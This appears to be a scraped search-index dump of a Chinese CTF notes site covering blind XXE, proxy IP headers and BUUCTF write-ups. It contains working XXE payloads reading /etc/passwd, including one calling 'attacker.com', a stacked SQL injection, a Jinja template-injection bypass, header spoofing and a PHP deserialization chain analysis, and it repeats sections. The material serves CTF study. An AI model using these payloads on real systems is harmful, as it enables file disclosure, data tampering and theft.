/nonexistent/ root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/usr/bin/nologin daemon:x:2:2:daemon:/:/usr/bin/nologin (No such file or directory) Contents of ext.dtd 1 2 3 4 <!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\"> %eval; %error; What can you do if there is a firewall between you and the target server? Nothing! What if we just put external DTD content directly in the DOCTYPE? Some errors will always appear: Request 1 2 3 4 5 6 7 8 <?xml version=\"1.0\" ?> <!DOCTYPE message [ <!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\"> %eval; %error; ]> <message></message> Response 1 2 Internal Error: SAX Parser Error. Detail: The parameter entity reference \u201c%file;\u201d cannot occur within markup in the internal subset of the DTD. External DTD allows us to include one entity inside the second, but it is prohibited in the internal DTD. What can we do with internal DTD? \u00b6 Request 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?xml version=\"1.0\" ?> <!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM \"file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd\"> <!ENTITY % condition 'aaa)> <!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; <!ELEMENT aa (bb'> %local_dtd; ]> <message>any text</message> Response 1 2 3 4 5 6 java.io.FileNotFoundException: /nonexistent/ root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/usr/bin/nologin daemon:x:2:2:daemon:/:/usr/bin/nologin (No such file or directory) Contents of sip-app_1_0.dtd 1 2 3 4 \u2026 <!ENTITY % condition \"and | or | not | equal | contains | exists | subdomain-of\"> <!ELEMENT pattern (%condition;)> \u2026 How can we find a local dtd file? \u00b6 Custom Linux System \u00b6 1 2 3 <!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"> <!ENTITY % ISOamsa 'Your DTD code'> %local_dtd; Custom Windows System \u00b6 1 2 3 <!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\"> <!ENTITY % SuperClass '>Your DTD code<!ENTITY test \"test\"'> %local_dtd; Cisco WebEx \u00b6 1 2 3 <!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd\"> <!ENTITY % url.attribute.set '>Your DTD code<!ENTITY test \"test\"'> %local_dtd; Citrix XenMobile Server \u00b6 1 2 3 <!ENTITY % local_dtd SYSTEM \"jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd\"> <!ENTITY % Body '>Your DTD code<!ENTITY test \"test\"'> %local_dtd; Custom Multi-Platform IBM WebSphere Application \u00b6 1 2 3 4 5 6 7 8 9 10 11 <!ENTITY % local_dtd SYSTEM \"./../../properties/schemas/j2ee/XMLSchema.dtd\"> <!ENTITY % xs-datatypes 'Your DTD code'> <!ENTITY % simpleType \"a\"> <!ENTITY % restriction \"b\"> <!ENTITY % boolean \"(c)\"> <!ENTITY % URIref \"CDATA\"> <!ENTITY % XPathExpr \"CDATA\"> <!ENTITY % QName \"NMTOKEN\"> <!ENTITY % NCName \"NMTOKEN\"> <!ENTITY % nonNegativeInteger \"NMTOKEN\"> %local_dtd; \u53c2\u8003 \u00b6 localDTD","title":"[Exploiting XXE with local DTD files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)"},{"location":"web/blindXXE/#exploiting-xxe-with-local-dtd-files","text":"","title":"Exploiting XXE with local DTD files"},{"location":"web/blindXXE/#error-based-example","text":"Request 1 2 3 4 5 6 <?xml version=\"1.0\" ?> <!DOCTYPE message [ <!ENTITY % ext SYSTEM \"http://attacker.com/ext.dtd\"> %ext; ]> <message></message> Response 1 2 3 4 5 6 java.io.FileNotFoundException: /nonexistent/ root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/usr/bin/nologin daemon:x:2:2:daemon:/:/usr/bin/nologin (No such file or directory) Contents of ext.dtd 1 2 3 4 <!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\"> %eval; %error; What can you do if there is a firewall between you and the target server? Nothing! What if we just put external DTD content directly in the DOCTYPE? Some errors will always appear: Request 1 2 3 4 5 6 7 8 <?xml version=\"1.0\" ?> <!DOCTYPE message [ <!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\"> %eval; %error; ]> <message></message> Response 1 2 Internal Error: SAX Parser Error. Detail: The parameter entity reference \u201c%file;\u201d cannot occur within markup in the internal subset of the DTD. External DTD allows us to include one entity inside the second, but it is prohibited in the internal DTD.","title":"error-based example:"},{"location":"web/blindXXE/#what-can-we-do-with-internal-dtd","text":"Request 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?xml version=\"1.0\" ?> <!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM \"file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd\"> <!ENTITY % condition 'aaa)> <!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; <!ELEMENT aa (bb'> %local_dtd; ]> <message>any text</message> Response 1 2 3 4 5 6 java.io.FileNotFoundException: /nonexistent/ root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/usr/bin/nologin daemon:x:2:2:daemon:/:/usr/bin/nologin (No such file or directory) Contents of sip-app_1_0.dtd 1 2 3 4 \u2026 <!ENTITY % condition \"and | or | not | equal | contains | exists | subdomain-of\"> <!ELEMENT pattern (%condition;)> \u2026","title":"What can we do with internal DTD?"},{"location":"web/blindXXE/#how-can-we-find-a-local-dtd-file","text":"","title":"How can we find a local dtd file?"},{"location":"web/blindXXE/#custom-linux-system","text":"1 2 3 <!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"> <!ENTITY % ISOamsa 'Your DTD code'> %local_dtd;","title":"Custom Linux System"},{"location":"web/blindXXE/#custom-windows-system","text":"1 2 3 <!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\"> <!ENTITY % SuperClass '>Your DTD code<!ENTITY test \"test\"'> %local_dtd;","title":"Custom Windows System"},{"location":"web/blindXXE/#cisco-webex","text":"1 2 3 <!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd\"> <!ENTITY % url.attribute.set '>Your DTD code<!ENTITY test \"test\"'> %local_dtd;","title":"Cisco WebEx"},{"location":"web/blindXXE/#citrix-xenmobile-server","text":"1 2 3 <!ENTITY % local_dtd SYSTEM \"jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd\"> <!ENTITY % Body '>Your DTD code<!ENTITY test \"test\"'> %local_dtd;","title":"Citrix XenMobile Server"},{"location":"web/blindXXE/#custom-multi-platform-ibm-websphere-application","text":"1 2 3 4 5 6 7 8 9 10 11 <!ENTITY % local_dtd SYSTEM \"./../../properties/schemas/j2ee/XMLSchema.dtd\"> <!ENTITY % xs-datatypes 'Your DTD code'> <!ENTITY % simpleType \"a\"> <!ENTITY % restriction \"b\"> <!ENTITY % boolean \"(c)\"> <!ENTITY % URIref \"CDATA\"> <!ENTITY % XPathExpr \"CDATA\"> <!ENTITY % QName \"NMTOKEN\"> <!ENTITY % NCName \"NMTOKEN\"> <!ENTITY % nonNegativeInteger \"NMTOKEN\"> %local_dtd;","title":"Custom Multi-Platform IBM WebSphere Application"},{"location":"web/blindXXE/#_1","text":"localDTD","title":"\u53c2\u8003"},{"location":"web/web0/","text":"CRLF\u6f0f\u6d1e \u00b6","title":"CRLF\u6f0f\u6d1e"},{"location":"web/web0/#crlf","text":"","title":"CRLF\u6f0f\u6d1e"},{"location":"web/webheader/","text":"X-Forwarded-For \u548c X-Real-IP \u7684\u533a\u522b\uff1f \u00b6 \u4e00\u822c\u6765\u8bf4\uff0c X-Forwarded-For \u662f\u7528\u4e8e\u8bb0\u5f55\u4ee3\u7406\u4fe1\u606f\u7684\uff0c\u6bcf\u7ecf\u8fc7\u4e00\u7ea7\u4ee3\u7406(\u533f\u540d\u4ee3\u7406\u9664\u5916)\uff0c\u4ee3\u7406\u670d\u52a1\u5668\u90fd\u4f1a\u628a\u8fd9\u6b21\u8bf7\u6c42\u7684 \u6765\u6e90IP \u8ffd\u52a0\u5728 X-Forwarded-For \u4e2d \u6765\u81ea 4.4.4.4 \u7684\u4e00\u4e2a\u8bf7\u6c42\uff0cheader\u5305\u542b\u8fd9\u6837\u4e00\u884c 1 X-Forwarded-For: 1.1.1.1, 2.2.2.2, 3.3.3.3 \u4ee3\u8868 \u8bf7\u6c42\u7531 1.1.1.1 \u53d1\u51fa\uff0c\u7ecf\u8fc7\u4e09\u5c42\u4ee3\u7406\uff0c\u7b2c\u4e00\u5c42\u662f 2.2.2.2 \uff0c\u7b2c\u4e8c\u5c42\u662f 3.3.3.3 \uff0c\u800c\u672c\u6b21\u8bf7\u6c42\u7684\u6765\u6e90IP 4.4.4.4 \u662f\u7b2c\u4e09\u5c42\u4ee3\u7406 \u800c X-Real-IP \uff0c\u6ca1\u6709\u76f8\u5173\u6807\u51c6\uff0c\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u5982\u679c\u914d\u7f6e\u4e86 X-Read-IP \uff0c\u53ef\u80fd\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 \u6240\u4ee5 \uff0c\u5982\u679c\u53ea\u6709\u4e00\u5c42\u4ee3\u7406\uff0c\u8fd9\u4e24\u4e2a\u5934\u7684\u503c\u5c31\u662f\u4e00\u6837\u7684 \u90a3\u4e00\u822c\u5728\u540e\u7aef\u53d6\u503c\uff08\u6bd4\u5982nodejs\u901a\u8fc7nginx\u4ee3\u7406\uff09\u662f\u7528\u54ea\u4e2a\u503c\u5462\uff1f\u6211\u770bsf\u4e0a\u770b\u4e00\u822c\u63a8\u8350\u662f\u7528X-Forwarded-For\uff0c\u76f4\u63a5\u7528 X-Real-IP\u5c82\u4e0d\u662f\u66f4\u65b9\u4fbf\u70b9\uff1f X-Forwarded-For\u786e\u5b9e\u662f\u4e00\u822c\u7684\u505a\u6cd5 1. \u4ed6\u5728\u6b63\u5411(\u5982squid)\u53cd\u5411(\u5982nginx)\u4ee3\u7406\u4e2d\u90fd\u662f\u6807\u51c6\u7528\u6cd5\uff0c\u800c\u6b63\u5411\u4ee3\u7406\u4e2d\u662f\u6ca1\u6709x-real-ip\u76f8\u5173\u7684\u6807\u51c6\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u7528\u6237\u8bbf\u95ee\u4f60\u7684 nginx\u53cd\u5411\u4ee3\u7406\u4e4b\u524d\uff0c\u8fd8\u7ecf\u8fc7\u4e86\u4e00\u5c42\u6b63\u5411\u4ee3\u7406\uff0c\u4f60\u5373\u4f7f\u5728nginx\u4e2d\u914d\u7f6e\u4e86x-real-ip\uff0c\u53d6\u5230\u7684\u4e5f\u53ea\u662f\u6b63\u5411\u4ee3\u7406\u7684IP\u800c\u4e0d\u662f\u5ba2\u6237\u7aef\u771f\u5b9eIP 2. \u5927\u90e8\u5206nginx\u53cd\u5411\u4ee3\u7406\u914d\u7f6e\u6587\u7ae0\u4e2d\u90fd\u6ca1\u6709\u63a8\u8350\u52a0\u4e0ax-real-ip \uff0c\u800c\u53ea\u6709x-forwarded-for\uff0c\u56e0\u6b64\u66f4\u901a\u7528\u7684\u505a\u6cd5\u81ea\u7136\u662f\u53d6x-forwarded-for 3. \u591a\u7ea7\u4ee3\u7406\u5f88\u5c11\u89c1\uff0c\u53ea\u6709\u4e00\u7ea7\u4ee3\u7406\u7684\u60c5\u51b5\u4e0b\u4e8c\u8005\u662f\u7b49\u6548\u7684 4. \u5982\u679c\u6709\u591a\u7ea7\u4ee3\u7406\uff0cx-forwarded-for\u6548\u679c\u662f\u5927\u4e8ex-real-ip\u7684\uff0c\u53ef\u4ee5\u8bb0\u5f55\u5b8c\u6574\u7684\u4ee3\u7406\u94fe\u8def \u6309\u7167 HTTP \u8bf7\u6c42\u5934\u4e2d\u7684 X-Forwarded-For \u8fd9\u7bc7\u6587\u7ae0\u7684\u4f8b\u5b50\uff0c\u5982\u679c\u5728Nginx\u7684\u53cd\u5411\u4ee3\u7406\u4e2d\u6dfb\u52a0\u4e86\u914d\u7f6e\u201cproxy_set_header X-Real-IP $remote_addr\u201d\uff0cX-Real-IP\u7684\u503c\u4e3a\u201d3.3.3.3\u201c \u4e8e\u662f\u6b64\u65f6\u6709\u4e00\u9053\u5f88\u6709\u8da3\u7684\u9898\u76ee \u00b6 \u9898\u76ee\u5927\u6982\u662f\u8fd9\u6837\u7684\uff0c\u8bbf\u95ee /flag \u88ab\u7981\u6b62\u4e86 \u53ea\u6709 localhost \u624d\u884c /flag \u8def\u7531\u88ab\u4fdd\u62a4\u4e86 echo.Context.RealIP is poisoned by \"X-Real-IP\" X-Real-IP: 127.0.0.1 \u901a\u8fc7\u5728\u8bf7\u6c42\u5934\u4e2d\u8bbe\u7f6e\u5373\u53ef","title":"X-Forwarded-For \u548c X-Real-IP \u7684\u533a\u522b\uff1f"},{"location":"web/webheader/#x-forwarded-for-x-real-ip","text":"\u4e00\u822c\u6765\u8bf4\uff0c X-Forwarded-For \u662f\u7528\u4e8e\u8bb0\u5f55\u4ee3\u7406\u4fe1\u606f\u7684\uff0c\u6bcf\u7ecf\u8fc7\u4e00\u7ea7\u4ee3\u7406(\u533f\u540d\u4ee3\u7406\u9664\u5916)\uff0c\u4ee3\u7406\u670d\u52a1\u5668\u90fd\u4f1a\u628a\u8fd9\u6b21\u8bf7\u6c42\u7684 \u6765\u6e90IP \u8ffd\u52a0\u5728 X-Forwarded-For \u4e2d \u6765\u81ea 4.4.4.4 \u7684\u4e00\u4e2a\u8bf7\u6c42\uff0cheader\u5305\u542b\u8fd9\u6837\u4e00\u884c 1 X-Forwarded-For: 1.1.1.1, 2.2.2.2, 3.3.3.3 \u4ee3\u8868 \u8bf7\u6c42\u7531 1.1.1.1 \u53d1\u51fa\uff0c\u7ecf\u8fc7\u4e09\u5c42\u4ee3\u7406\uff0c\u7b2c\u4e00\u5c42\u662f 2.2.2.2 \uff0c\u7b2c\u4e8c\u5c42\u662f 3.3.3.3 \uff0c\u800c\u672c\u6b21\u8bf7\u6c42\u7684\u6765\u6e90IP 4.4.4.4 \u662f\u7b2c\u4e09\u5c42\u4ee3\u7406 \u800c X-Real-IP \uff0c\u6ca1\u6709\u76f8\u5173\u6807\u51c6\uff0c\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u5982\u679c\u914d\u7f6e\u4e86 X-Read-IP \uff0c\u53ef\u80fd\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 \u6240\u4ee5 \uff0c\u5982\u679c\u53ea\u6709\u4e00\u5c42\u4ee3\u7406\uff0c\u8fd9\u4e24\u4e2a\u5934\u7684\u503c\u5c31\u662f\u4e00\u6837\u7684 \u90a3\u4e00\u822c\u5728\u540e\u7aef\u53d6\u503c\uff08\u6bd4\u5982nodejs\u901a\u8fc7nginx\u4ee3\u7406\uff09\u662f\u7528\u54ea\u4e2a\u503c\u5462\uff1f\u6211\u770bsf\u4e0a\u770b\u4e00\u822c\u63a8\u8350\u662f\u7528X-Forwarded-For\uff0c\u76f4\u63a5\u7528 X-Real-IP\u5c82\u4e0d\u662f\u66f4\u65b9\u4fbf\u70b9\uff1f X-Forwarded-For\u786e\u5b9e\u662f\u4e00\u822c\u7684\u505a\u6cd5 1. \u4ed6\u5728\u6b63\u5411(\u5982squid)\u53cd\u5411(\u5982nginx)\u4ee3\u7406\u4e2d\u90fd\u662f\u6807\u51c6\u7528\u6cd5\uff0c\u800c\u6b63\u5411\u4ee3\u7406\u4e2d\u662f\u6ca1\u6709x-real-ip\u76f8\u5173\u7684\u6807\u51c6\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u7528\u6237\u8bbf\u95ee\u4f60\u7684 nginx\u53cd\u5411\u4ee3\u7406\u4e4b\u524d\uff0c\u8fd8\u7ecf\u8fc7\u4e86\u4e00\u5c42\u6b63\u5411\u4ee3\u7406\uff0c\u4f60\u5373\u4f7f\u5728nginx\u4e2d\u914d\u7f6e\u4e86x-real-ip\uff0c\u53d6\u5230\u7684\u4e5f\u53ea\u662f\u6b63\u5411\u4ee3\u7406\u7684IP\u800c\u4e0d\u662f\u5ba2\u6237\u7aef\u771f\u5b9eIP 2. \u5927\u90e8\u5206nginx\u53cd\u5411\u4ee3\u7406\u914d\u7f6e\u6587\u7ae0\u4e2d\u90fd\u6ca1\u6709\u63a8\u8350\u52a0\u4e0ax-real-ip \uff0c\u800c\u53ea\u6709x-forwarded-for\uff0c\u56e0\u6b64\u66f4\u901a\u7528\u7684\u505a\u6cd5\u81ea\u7136\u662f\u53d6x-forwarded-for 3. \u591a\u7ea7\u4ee3\u7406\u5f88\u5c11\u89c1\uff0c\u53ea\u6709\u4e00\u7ea7\u4ee3\u7406\u7684\u60c5\u51b5\u4e0b\u4e8c\u8005\u662f\u7b49\u6548\u7684 4. \u5982\u679c\u6709\u591a\u7ea7\u4ee3\u7406\uff0cx-forwarded-for\u6548\u679c\u662f\u5927\u4e8ex-real-ip\u7684\uff0c\u53ef\u4ee5\u8bb0\u5f55\u5b8c\u6574\u7684\u4ee3\u7406\u94fe\u8def \u6309\u7167 HTTP \u8bf7\u6c42\u5934\u4e2d\u7684 X-Forwarded-For \u8fd9\u7bc7\u6587\u7ae0\u7684\u4f8b\u5b50\uff0c\u5982\u679c\u5728Nginx\u7684\u53cd\u5411\u4ee3\u7406\u4e2d\u6dfb\u52a0\u4e86\u914d\u7f6e\u201cproxy_set_header X-Real-IP $remote_addr\u201d\uff0cX-Real-IP\u7684\u503c\u4e3a\u201d3.3.3.3\u201c","title":"X-Forwarded-For \u548c X-Real-IP \u7684\u533a\u522b\uff1f"},{"location":"web/webheader/#_1","text":"\u9898\u76ee\u5927\u6982\u662f\u8fd9\u6837\u7684\uff0c\u8bbf\u95ee /flag \u88ab\u7981\u6b62\u4e86 \u53ea\u6709 localhost \u624d\u884c /flag \u8def\u7531\u88ab\u4fdd\u62a4\u4e86 echo.Context.RealIP is poisoned by \"X-Real-IP\" X-Real-IP: 127.0.0.1 \u901a\u8fc7\u5728\u8bf7\u6c42\u5934\u4e2d\u8bbe\u7f6e\u5373\u53ef","title":"\u4e8e\u662f\u6b64\u65f6\u6709\u4e00\u9053\u5f88\u6709\u8da3\u7684\u9898\u76ee"},{"location":"writeup/","text":"writeup \u00b6","title":"writeup"},{"location":"writeup/#writeup","text":"","title":"writeup"},{"location":"writeup/BUUCTF/","text":"BUUCTF \u00b6 \u968f\u4fbf\u6ce8 \u00b6 \u6709\u8fc7\u6ee4\uff1a sqlmap \u53ef\u4ee5\u629b\u51fa\u6570\u636e\u5e93\u540d \u4f46\u662f\u8868\u540d\u6ca1\u6cd5\u5217\u51fa \u5806\u53e0\u6ce8\u5165 get 1' or 1=1 1'; show databases; # 1'; show tables# 1'; show columns from 1919810931114514# \u6709\u4e00\u4e2aflag\u7684\u5b57\u6bb5\u4f46\u662f\u4f60\u67e5\u4e0d\u51fa\u6765 \u63a5\u4e0b\u6765\u770b words \u4ed6\u65e2\u7136\u6ca1\u8fc7\u6ee4 alert \u548c rename\uff0c\u90a3\u4e48\u6211\u4eec\u662f\u4e0d\u662f\u53ef\u4ee5\u628a\u8868\u6539\u4e2a\u540d\u5b57\uff0c\u518d\u7ed9\u5217\u6539\u4e2a\u540d\u5b57\u5462\u3002 \u5148\u628a words \u6539\u540d\u4e3a words1\uff0c\u518d\u628a\u8fd9\u4e2a\u6570\u5b57\u8868\u6539\u540d\u4e3a words\uff0c\u7136\u540e\u628a\u65b0\u7684 words \u91cc\u7684 flag \u5217\u6539\u4e3a id \uff08\u907f\u514d\u4e00\u5f00\u59cb\u65e0\u6cd5\u67e5\u8be2\uff09\u3002 \u8fd9\u6837\u5c31\u53ef\u4ee5\u8ba9\u7a0b\u5e8f\u76f4\u63a5\u67e5\u8be2\u51fa flag \u4e86\u3002 1 2 3 4 .\u6784\u9020 payload \u5982\u4e0b\uff0c\u7136\u540e\u8bbf\u95ee\uff0c\u770b\u5230\u8fd9\u4e2a\u770b\u6765\u5c31\u6267\u884c\u5230\u6700\u540e\u4e00\u4e2a\u8bed\u53e5\u4e86\u3002\uff08\u6539\u8868\u540d\u90a3\u91cc\u76f4\u63a5\u4ece pma \u62f7\u4e86\u4e00\u4e2a\u8bed\u53e5\u8fc7\u6765\u6539- -\uff09 /?inject=1%27;RENAME%20TABLE%20`words`%20TO%20`words1`;RENAME%20TABLE%20`1919810931114514`%20TO%20`words`;ALTER%20TABLE%20`words`%20CHANGE%20`flag`%20`id`%20VARCHAR(100)%20CHARACTER%20SET%20utf8%20COLLATE%20utf8_general_ci%20NOT%20NULL;show%20columns%20from%20words;# /?inject=1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;# \u7136\u540eflag\u5c31\u51fa\u6765\u4e86 FLAG \u00b6 \u4e00\u5f20\u56fe\u7247 zsteg \u5de5\u5177\u5206\u6790\uff1a \u6709\u63d0\u793azip\u6587\u4ef6 \u63d0\u53d6\u51fa\u6765 zsteg 42011487927629132.png -E b1,rgb,lsb,xy > out \u5c1d\u8bd5\u89e3\u538b\u63d0\u53d6\u51fa\u6765\u7684\u95ee\u9898\u63d0\u793a\u62a5\u9519 \u4e00\u822c\u7528winrar\u89e3\u538b\u7f29\u9519\u8bef\u7684\u90fd\u53ef\u4ee5\u75287z\u89e3\u538b\u7f29 \u7136\u540e\u5c31\u5f97\u5230\u4e86\u4e00\u4e2a elf \u683c\u5f0f\u7684\u6587\u4ef6 \u8fd0\u884c\u5c31\u53ef\u4ee5\u5f97\u5230flag \u955c\u5b50\u91cc\u9762\u7684\u4e16\u754c \u00b6 \u76f4\u63a5\u4e0a zsteg \u5de5\u5177 ningen |MISC \u00b6 \u6709\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u4f46\u662f\u6ca1\u6709\u7206\u7834\u51fa\u5bc6\u7801 rar | MISC \u00b6 \u5b66\u4e60\u4e00\u4e9b\u5982\u4f55\u7206\u7834\u538b\u7f29\u5305 \u8fd9\u6837\u5c31\u53ef\u4ee5\u8bbe\u7f6e\u957f\u5ea6\u4e3a\u591a\u5c11\u4e86 \u4f46\u662f\u7206\u7834\u633a\u6162\u7684\uff0c\u627e\u4e86\u4e00\u4e2a\u6ce8\u518c\u7801 **ARCHPRP-GSVMT-66892-GKVMB-52992** \u4e0d\u8fc7\u8fd8\u662f\u5f88\u6162\u662f\u4e3a\u5565\uff1f\uff1f shrine | web \u00b6 \u5728BUUCTF\u4e0a\u627e\u5230\u4e86\u8fd9\u9898\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import flask import os app = flask . Flask ( __name__ ) app . config [ 'FLAG' ] = os . environ . pop ( 'FLAG' ) @app.route ( '/' ) def index (): return open ( __file__ ) . read () @app.route ( '/shrine/<path:shrine>' ) def shrine ( shrine ): def safe_jinja ( s ): s = s . replace ( '(' , '' ) . replace ( ')' , '' ) blacklist = [ 'config' , 'self' ] return '' . join ([ '{{ % s et {}=None%}}' . format ( c ) for c in blacklist ]) + s return flask . render_template_string ( safe_jinja ( shrine )) if __name__ == '__main__' : app . run ( debug = True ) \u7531\u4e8e\u77e5\u9053\u4e86\u601d\u8def\u5229\u7528\u8d77\u6765\u4e5f\u5f88\u7b80\u5355\u4e86 1 url_for.__globals__.current_app.config \u5c31\u53ef\u4ee5\u4e86 \u6885\u82b1\u9999\u81ea\u82e6\u5bd2\u6765 | MISC \u00b6 \u4f3c\u4e4e\u5c31\u662fbugku\u7684\u4e00\u9053\u9898 \u4e3b\u8981\u662f\u8fd9\u4e32\u7f16\u7801\u5982\u4f55\u5904\u7406 \u5148\u8f6c\u6362\u4e3aASCII\u7801 \u7136\u540e\u7528notepad++\u6253\u5f00\u66ff\u6362\u6389 (,) \u66ff\u6362\u7684\u90a3\u4e2a\u4ec0\u4e48\u90fd\u4e0d\u586b\u5c31\u884c kali\u4e2d\u4f7f\u7528 gnuplot \u753b\u56fe plot \"aaa.txt\" \u6211\u7528WSL\u5931\u8d25\u4e86 \u9762\u5177\u4e0b\u7684flag | MISC \u00b6 \u56fe\u7247\u91cc\u9762\u6709\u4e1c\u897f \u4e0d\u77e5\u9053\u4e3a\u5565\u538b\u7f29\u5305\u91cc\u7684\u5185\u5bb9\u76f4\u63a5\u88ab\u641e\u51fa\u6765\u4e86\uff0c\u672c\u6765\u8fd8\u4ee5\u4e3a\u662f\u660e\u6587\u653b\u51fb\u7684 \u7136\u540estrings\u627e\u4e00\u4e0b\uff0c\u89e3\u7801\u51d1\u9f50flag flag{N7F5_AD5_i5_funny!} webshell | MISC \u00b6 \u7528d\u76fe\u626b\u63cf\u5c31\u884c \u4f46\u662f\u6211\u8fd8\u662f\u4e0d\u77e5\u9053flag\u5728\u54ea\u3002\u3002 \u4e0d\u8fc7\u8ba4\u8bc6\u4e86D\u76fe\u8fd9\u4e2a\u597d\u5de5\u5177 \u8377\u5170\u3002\u3002\u6570\u636e\u6cc4\u9732 | MISC \u00b6 binwalk\uff0cstrings\uff0cforemost\u90fd\u8bd5\u4e86\u4e00\u904d\u90fd\u6ca1\u6548\u679c\u3002\u3002 \u539f\u6765\u662f\u8def\u7531\u5668\u7684\u4e1c\u4e1c \u53bb\u8fd9\u91cc\u4e0b\u8f7d\u4e00\u4e2a\u5de5\u5177 flag\u5c31\u662f\u7528\u6237\u540d \u6570\u636e\u5305\u4e2d\u7684\u7ebf\u7d22 | MISC \u00b6 \u76f4\u63a5\u5bfc\u51faHTTP \u7136\u540e\u53d1\u73b0\u5176\u4e2d\u6709\u4e00\u4e2a\u56fe\u7247\u85cf\u5f97\u6bd4\u8f83\u6df1 \u53c2\u8003 upload| web \u00b6 \u8fd9\u662fqwb\u7684\u4e00\u9053\u9898\u76ee\uff0c\u91cd\u70b9\u8003\u5bdfpop\u94fe\u7684\u6784\u9020\uff0c\u7531\u4e8e\u81ea\u5df1tc\u5bfc\u81f4\u6ca1\u80fd\u641e\u51fa\u6765 \u53c2\u8003\u4e00\u53f6\u98d8\u96f6\u5e08\u5085\u7684\u6587\u7ae0\u5206\u6790\u4e00\u6ce2 \u5728 web/controller/Profile.php \u770b\u5230\u5173\u952e\u51fd\u6570\u64cd\u4f5c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 public function upload_img(){ if($this->checker){ if(!$this->checker->login_check()){ $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/index\"; $this->redirect($curr_url,302); exit(); } } if(!empty($_FILES)){ $this->filename_tmp=$_FILES['upload_file']['tmp_name']; $this->filename=md5($_FILES['upload_file']['name']).\".png\"; $this->ext_check(); } if($this->ext) { if(getimagesize($this->filename_tmp)){ @copy($this->filename_tmp, $this->filename); @unlink($this->filename_tmp); $this->img=\"../upload/$this->upload_menu/$this->filename\"; $this->update_img();}else{ $this->error('Forbidden type!', url('../index'));} } else{ $this->error('Unknow file type!', url('../index')); } } upload_img \u65b9\u6cd5\u4e2d\uff0c\u5982\u679c $this->ext \u4e3atrue\u5c31\u4f1a\u5c06\u6587\u4ef6\u6539\u540d\uff0c\u800c $this->filename_tmp \u548c $this->filename \u90fd\u53ef\u4ee5\u901a\u8fc7\u53cd\u5e8f\u5217\u5316\u76f4\u63a5\u63a7\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u60f3\u529e\u6cd5\u9664\u6cd5\u8fd9\u4e2a upload_img \u51fd\u6570 \u53ef\u4ee5\u5229\u7528\u7684\u70b9\u81ea\u7136\u662fcookie\u4e2d\u7684\u53cd\u5e8f\u5217\u5316 \u627e\u5230\u4e24\u4e2a\u9b54\u672f\u65b9\u6cd5\uff1a 1 2 3 4 5 6 7 8 9 10 11 public function __get($name) { return $this->except[$name]; } public function __call($name, $arguments) { if($this->{$name}){ $this->{$this->{$name}}($arguments); } } \u901a\u8fc7\u8c03\u7528\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\u65f6\u53ef\u4ee5\u89e6\u53d1 __call \u7136\u540e $this->{$name} \u8bbf\u95ee\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\u65f6\u53ef\u4ee5\u89e6\u53d1 __get \u90a3\u4e48\u5bfb\u627e\u89e6\u53d1\u65b9\u5f0f\u53ef\u4ee5\u53d1\u73b0\u6587\u4ef6 web/controller/Register.php \uff0c\u5173\u952e\u90e8\u5206\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Register extends Controller { public $checker; public $registed; public function __construct() { $this->checker=new Index(); } public function __destruct() { if(!$this->registed){ $this->checker->index(); } } } 